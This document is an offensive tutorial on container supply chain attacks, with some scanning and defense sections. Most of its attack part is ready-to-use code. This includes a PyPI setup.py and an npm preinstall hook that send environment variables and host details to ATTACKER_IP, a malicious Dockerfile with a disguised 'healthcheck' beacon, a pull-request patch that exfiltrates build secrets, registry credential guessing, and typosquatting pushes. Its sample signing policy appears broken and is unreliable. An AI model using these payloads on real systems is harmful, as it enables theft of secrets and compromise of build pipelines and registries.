# Container Supply Chain Attack Guide

> Comprehensive guide to container image supply chain attacks including malicious base image injection, dependency confusion, registry poisoning, typosquatting, and CI/CD pipeline compromise. Learn to assess and exploit the container build and distribution pipeline.

## Introduction

The container supply chain encompasses every step from base image selection through build, distribution, and deployment. Each step represents a potential attack surface: base images from public registries may contain malicious code, build pipelines can be compromised to inject backdoors, and registry authentication may be weak or missing. Supply chain attacks are particularly dangerous because they compromise the trust model itself -- a malicious image deployed through the official pipeline inherits all the permissions and trust of a legitimate deployment.

According to industry research, over 60% of production container images contain at least one critical or high-severity vulnerability, and public registries like Docker Hub host thousands of malicious images disguised as popular packages. This guide covers practical techniques for testing container supply chain security, from image analysis to registry exploitation.

Understanding supply chain attacks is essential for both offensive security professionals assessing deployment pipelines and defenders implementing image verification, signing, and admission controls.

### Attack Surface Overview

| Attack Vector | Target | Complexity | Impact |
|---------------|--------|------------|--------|
| Malicious base image | Image build pipeline | Medium | Backdoor in every derived image |
| Dependency confusion | Package managers (npm, pip) | Low | Arbitrary code execution at build |
| Typosquatting | Image pull operations | Low | Malicious image execution |
| Registry poisoning | Container registry | High | Malicious image distribution |
| Image tag collision | Deployment pipeline | Medium | Unexpected image execution |
| CI/CD pipeline compromise | Build system | High | Build artifact tampering |
| Layer injection | Image layers | High | Hidden code in trusted images |
| Notary/signing bypass | Image verification | Medium | Unsigned image acceptance |

## Prerequisites

- Kali Linux with Docker and skopeo installed
- Understanding of Docker image layers, registries, and OCI specification
- Familiarity with CI/CD systems (Jenkins, GitLab CI, GitHub Actions)
- Tools: `docker`, `skopeo`, `dive`, `trivy`, `grype`, `cosign`, `crane`

## 1. Malicious Base Image Analysis

### Detecting Suspicious Base Images

```bash
# Analyze Docker image layers with dive
dive alpine:latest
# Shows layer-by-layer breakdown with file changes

# Pull and inspect image metadata
docker pull target-image:latest
docker inspect target-image:latest | jq '.[0].Config'

# Check image history (build commands)
docker history --no-trunc target-image:latest

# Scan for known vulnerabilities
trivy image target-image:latest

# Deep scan with grype for specific CVEs
grype target-image:latest | grep -i "critical\|high"

# Analyze image size anomalies (unexpected large layers)
docker images --format "{{.Repository}}:{{.Tag}} {{.Size}}" | sort -k2 -h
```

### Extracting and Analyzing Image Layers

```bash
# Save image to tar for layer analysis
docker save target-image:latest -o image.tar

# Extract layers
mkdir -p /tmp/image_analysis && cd /tmp/image_analysis
tar xf /tmp/image.tar

# Inspect manifest
cat manifest.json | jq .
cat imagedb/content/sha256/*/json 2>/dev/null | jq .

# List all layers
ls -la blobs/sha256/

# Extract each layer and look for suspicious content
for layer in blobs/sha256/*; do
    echo "=== Analyzing layer: $(basename $layer) ==="
    file $layer | head -1
    if file $layer | grep -q "gzip"; then
        mkdir -p /tmp/layer_$(basename $layer)
        tar xzf $layer -C /tmp/layer_$(basename $layer) 2>/dev/null
        # Look for suspicious files
        find /tmp/layer_$(basename $layer) -type f \( \
            -name "*.sh" -o -name "*.py" -o -name "*.pl" \
            -o -name "*.so" -o -name "*.dll" -o -name "*.exe" \
            -name ".hidden*" -o -name ".*.sh" \) 2>/dev/null
    fi
done

# Search for embedded secrets in layers
for layer in blobs/sha256/*; do
    if file $layer | grep -q "gzip"; then
        tar xzf $layer -O 2>/dev/null | strings | grep -iE \
            "(password|secret|api.key|token|private.key|BEGIN RSA)" | head -5
    fi
done
```

### Identifying Backdoored Images

```bash
# Compare suspicious image against known-good version
# Method 1: Compare digests
docker pull alpine:latest
docker inspect alpine:latest --format '{{.Id}}'

# Method 2: Compare layer counts
docker history alpine:latest --format "{{.CreatedBy}}" | wc -l

# Method 3: Check for unexpected network connections
docker run --rm --entrypoint="" target-image:latest \
    sh -c "netstat -tlnp 2>/dev/null || ss -tlnp"

# Method 4: Check for cron jobs, startup scripts, or hidden services
docker run --rm --entrypoint="" target-image:latest \
    sh -c "cat /etc/crontab; ls -la /etc/cron.d/; cat /etc/rc.local 2>/dev/null"

# Method 5: Check for unexpected SUID binaries
docker run --rm --entrypoint="" target-image:latest \
    find / -perm -4000 -type f 2>/dev/null

# Method 6: Analyze environment variables for secrets
docker inspect target-image:latest --format '{{range .Config.Env}}{{println .}}{{end}}'
```

## 2. Dependency Confusion Attacks

### Exploiting Package Manager Resolution

```bash
# Dependency confusion: public registry package has higher version
# than private registry package, causing package manager to pull from public

# Python (pip) dependency confusion
# Step 1: Identify internal package names from requirements.txt
cat requirements.txt
# e.g., internal-utils==1.0.0

# Step 2: Create a malicious package with the same name on PyPI
# with a higher version number (2.0.0)
mkdir -p evil_package && cd evil_package

cat > setup.py << 'EOF'
from setuptools import setup
import os

# Malicious payload: exfiltrate environment variables on install
os.system('curl -s http://ATTACKER_IP:8080/$(env | base64 | tr -d "\n")')

setup(
    name="internal-utils",
    version="2.0.0",  # Higher than private version
    packages=["internal_utils"],
    description="Internal utilities",
)
EOF

mkdir -p internal_utils
cat > internal_utils/__init__.py << 'EOF'
# Legitimate-looking stub to avoid suspicion
"""Internal utilities package."""
pass
EOF

# Step 3: Upload to PyPI
python3 -m twine upload dist/*

# Step 4: When build runs pip install, it may pull the public version
```

### npm Dependency Confusion

```bash
# npm dependency confusion attack
# Step 1: Identify internal npm packages from package.json
cat package.json | jq '.dependencies'
# e.g., "@company/internal-lib": "1.2.0"

# Step 2: Create malicious package
mkdir -p evil-npm-pkg && cd evil-npm-pkg

cat > package.json << 'EOF'
{
  "name": "internal-lib",
  "version": "99.0.0",
  "description": "Internal library",
  "scripts": {
    "preinstall": "curl http://ATTACKER_IP:8080/$(whoami)-$(hostname) || true"
  }
}
EOF

# Step 3: Publish to npm registry
npm publish --access public

# Step 4: Monitor for callbacks during target build process
python3 -m http.server 8080
```

### Container Build Time Exploitation

```bash
# Many Dockerfiles run pip/npm install without proper registry pinning
# Identify vulnerable Dockerfiles

# Scan for unpinned dependency installations
grep -r "pip install" . --include="Dockerfile*" | grep -v "index-url\|extra-index-url\|trusted-host"
grep -r "npm install" . --include="Dockerfile*" | grep -v "registry"

# Proper mitigation: pin to private registry
# Dockerfile with pip:
cat > Dockerfile.secure << 'EOF'
FROM python:3.11-slim
COPY requirements.txt .
RUN pip install --index-url https://pypi.internal.company.com/simple/ \
                  --extra-index-url https://pypi.org/simple/ \
                  --no-deps \
                  -r requirements.txt
EOF

# Dockerfile with npm:
cat > Dockerfile.secure_npm << 'EOF'
FROM node:18-slim
COPY package.json .
RUN npm install --registry https://npm.internal.company.com
EOF
```

## 3. Container Registry Attacks

### Registry Enumeration and Access

```bash
# Docker Registry HTTP API V2 enumeration
# Check for unauthenticated registries
curl -s https://registry.example.com/v2/_catalog
curl -s http://registry.example.com:5000/v2/_catalog

# List tags for a specific repository
curl -s https://registry.example.com/v2/myapp/tags/list

# Get image manifest (detailed layer info)
curl -s https://registry.example.com/v2/myapp/manifests/latest \
  -H "Accept: application/vnd.docker.distribution.manifest.v2+json" | jq .

# Check registry version and headers
curl -sI https://registry.example.com/v2/ | head -20

# Authentication bypass attempts
curl -s https://registry.example.com/v2/_catalog -H "Authorization: Basic dXNlcjpwYXNz"
# Try common credentials
for cred in "admin:admin" "docker:docker" "guest:guest" "test:test"; do
    encoded=$(echo -n "$cred" | base64)
    response=$(curl -s -o /dev/null -w "%{http_code}" \
        https://registry.example.com/v2/_catalog \
        -H "Authorization: Basic $encoded")
    echo "$cred -> HTTP $response"
done
```

### Registry Poisoning

```bash
# Push a malicious image to a compromised registry
# Step 1: Authenticate to the registry
docker login registry.example.com -u compromised_user -p password

# Step 2: Tag a malicious image as a legitimate one
# Build a malicious image
cat > Dockerfile.malicious << 'EOF'
FROM alpine:latest
# Hidden reverse shell in entrypoint
RUN apk add --no-cache bash curl
RUN echo '#!/bin/bash' > /usr/local/bin/healthcheck && \
    echo 'curl -s http://ATTACKER_IP:8080/r -d "$(cat /etc/hostname)" &' >> /usr/local/bin/healthcheck && \
    echo 'exec "$@"' >> /usr/local/bin/healthcheck && \
    chmod +x /usr/local/bin/healthcheck
ENTRYPOINT ["healthcheck"]
CMD ["sh"]
EOF

docker build -t registry.example.com/legitimate-app:latest -f Dockerfile.malicious .
docker push registry.example.com/legitimate-app:latest

# Step 3: Overwrite a specific tag (if push permissions allow)
docker tag alpine:latest registry.example.com/base-image:1.0
docker push registry.example.com/base-image:1.0
```

### Using Skopeo for Registry Operations

```bash
# Skopeo operates on remote images without Docker daemon
# List tags without pulling
skopeo list-tags docker://registry.example.com/myapp

# Inspect remote image
skopeo inspect docker://registry.example.com/myapp:latest

# Copy image between registries (for lateral movement)
skopeo copy docker://registry.example.com/app:v1 docker://attacker-registry.com/stolen-app:v1

# Copy with authentication
skopeo copy --src-creds=user:pass \
    docker://registry.example.com/internal-tool:latest \
    docker://evil-registry.com/internal-tool:latest

# Delete a tag (if registry allows)
skopeo delete docker://registry.example.com/myapp:old-tag --creds admin:password
```

## 4. Image Tag and Digest Attacks

### Tag Overwrite and Collision

```bash
# Tags are mutable -- the same tag can point to different images
# Attack: overwrite a tag with a malicious image

# Step 1: Note the current digest of a target image
docker pull registry.example.com/app:stable
CURRENT_DIGEST=$(docker inspect registry.example.com/app:stable --format '{{.Id}}')
echo "Current digest: $CURRENT_DIGEST"

# Step 2: Build malicious image and push with the same tag
docker build -t registry.example.com/app:stable -f Dockerfile.malicious .
docker push registry.example.com/app:stable

# Step 3: Deployments using :stable tag now pull the malicious image

# Defense: Use digest pinning instead of tags
# docker pull registry.example.com/app@sha256:abc123...
```

### Typosquatting Attacks

```bash
# Create images with names similar to popular ones
# Common typosquatting patterns:

# Popular image: nginx
# Typosquats: nginix, ngix, ngnix, enginx
# Popular image: node
# Typosquats: nodejs, node-js, nodedocker
# Popular image: postgres
# Typosquats: postgress, postgre, postgresql

# Build and push typosquatted images
for name in nginix ngix ngnix; do
    docker build -t eviluser/$name:latest -f Dockerfile.malicious .
    docker push eviluser/$name:latest
done

# Check for typosquatting in deployment manifests
grep -r "image:" k8s-manifests/ | awk '{print $2}' | sort -u
# Review each image name for typos
```

## 5. CI/CD Pipeline Compromise

### Exploiting Build Pipelines

```bash
# GitHub Actions supply chain attack
# Step 1: Identify workflow files
cat .github/workflows/build.yml

# Step 2: Check for vulnerable actions (pinned by tag, not SHA)
grep -r "uses:" .github/workflows/ | grep -v "@sha256:"
# Vulnerable: uses: actions/checkout@v3
# Secure:     uses: actions/checkout@f43a01518e9e4ec5e4c6e5c

# Step 3: Identify secrets available in build
grep -r "secrets\." .github/workflows/

# Step 4: Inject malicious commands via PR
# Create a PR that modifies the Dockerfile or build script
cat > evil-pr-patch.patch << 'EOF'
--- a/Dockerfile
+++ b/Dockerfile
@@ -1,3 +1,4 @@
 FROM node:18-slim
+RUN curl -s http://ATTACKER_IP:8080/build -d "$(env | base64)" || true
 WORKDIR /app
 COPY package*.json ./
EOF
```

### Image Signing Verification Bypass

```bash
# Check if images are signed with cosign
cosign verify registry.example.com/app:latest

# If signing is not enforced, push unsigned malicious images
docker push registry.example.com/app:latest

# Bypass Kubernetes admission controllers that check signing
# If using OPA/Gatekeeper, check the policy:
kubectl get constrainttemplate -A
kubectl get k8srequiredsignatures -A -o yaml

# Check for image admission webhook
kubectl get validatingwebhookconfigurations -A
kubectl get mutatingwebhookconfigurations -A
```

## 6. Software Bill of Materials (SBOM) Analysis

### Generating and Analyzing SBOMs

```bash
# Generate SBOM using Syft
syft registry.example.com/app:latest -o json > sbom.json
syft registry.example.com/app:latest -o spdx-json > sbom-spdx.json
syft registry.example.com/app:latest -o cyclonedx-json > sbom-cyclone.json

# Query SBOM for specific components
cat sbom.json | jq '.artifacts[] | select(.name | contains("openssl"))'
cat sbom.json | jq '.artifacts[] | select(.version | startswith("1.0."))'

# Scan SBOM against vulnerability database
grype sbom:sbom.json

# Compare SBOMs between image versions to detect changes
diff <(syft app:v1 -o json | jq -S '.artifacts[] | .name + "@" + .version') \
     <(syft app:v2 -o json | jq -S '.artifacts[] | .name + "@" + .version')
```

## Hands-on Exercise: Supply Chain Assessment

### Scenario: Assessing a Production Deployment Pipeline

```bash
# Step 1: Identify all images in use
kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}' | tr ' ' '\n' | sort -u

# Step 2: Check for tag vs digest pinning
kubectl get pods -A -o json | jq -r '.items[].spec.containers[].image' | \
    grep -v "@sha256" && echo "[WARN] Images using tags instead of digests"

# Step 3: Scan each image
for img in $(kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}' | tr ' ' '\n' | sort -u); do
    echo "=== Scanning: $img ==="
    trivy image --severity HIGH,CRITICAL "$img" 2>/dev/null | tail -5
done

# Step 4: Check for exposed registries
nmap -p 5000,443,80 10.0.0.0/24 --open -T4 --script http-title

# Step 5: Test registry authentication
for registry in $(nmap -p 5000 10.0.0.0/24 --open -T4 | grep "Nmap scan report" | awk '{print $NF}'); do
    echo "Testing: $registry:5000"
    curl -s "http://$registry:5000/v2/_catalog" | head -20
done

# Step 6: Generate SBOM for critical images
syft registry.example.com/critical-app:latest -o json > critical_sbom.json
grype sbom:critical_sbom.json --fail-on critical

echo "=== Supply Chain Assessment Complete ==="
```

## Defense Perspective

### Securing the Container Supply Chain

```bash
# 1. Use image signing with cosign
cosign sign --key cosign.key registry.example.com/app:latest

# 2. Enforce signed images in Kubernetes
cat > policy.yaml << 'EOF'
apiVersion: templates.gatekeeper.sh/v1
kind: ConstraintTemplate
metadata:
  name: k8srequiredsignatures
spec:
  crd:
    spec:
      names:
        kind: K8sRequiredSignatures
  targets:
    - target: admission.k8s.gatekeeper.sh
      rego: |
        package k8srequiredsignatures
        violation[{"msg": msg}] {
          input.review.object.spec.containers[_].image
          not input.review.object.spec.containers[_].image == "signed"
          msg := "Image must be signed"
        }
EOF

# 3. Pin images by digest, not tag
# BAD:  image: nginx:latest
# GOOD: image: nginx@sha256:abc123def456...

# 4. Use private registries with authentication
# 5. Scan images before deployment
# 6. Generate and verify SBOMs
# 7. Use multi-stage builds to minimize attack surface

# Example secure Dockerfile
cat > Dockerfile.secure << 'EOF'
# Pin base image by digest
FROM node:18-slim@sha256:abc123... AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production --registry https://npm.internal.company.com
COPY . .
RUN npm run build

# Minimal runtime image
FROM gcr.io/distroless/nodejs18-debian11:nonroot@sha256:def456...
COPY --from=builder /app/dist ./dist
USER nonroot
EXPOSE 3000
CMD ["dist/server.js"]
EOF
```

## References

- **OCI Image Specification**: https://github.com/opencontainers/image-spec
- **Docker Content Trust**: https://docs.docker.com/engine/security/trust/
- **Sigstore (cosign)**: https://docs.sigstore.dev/
- **Syft SBOM Generator**: https://github.com/anchore/syft
- **Trivy Vulnerability Scanner**: https://github.com/aquasecurity/trivy
- **Supply Chain Attacks on Containers (SANS)**: https://www.sans.org/white-papers/
- **NIST Supply Chain Risk Management**: https://csrc.nist.gov/projects/supply-chain-risk-management
- **CIS Container Security Benchmark**: https://www.cisecurity.org/benchmark/kubernetes
- **Docker Hub Security Best Practices**: https://docs.docker.com/docker-hub/
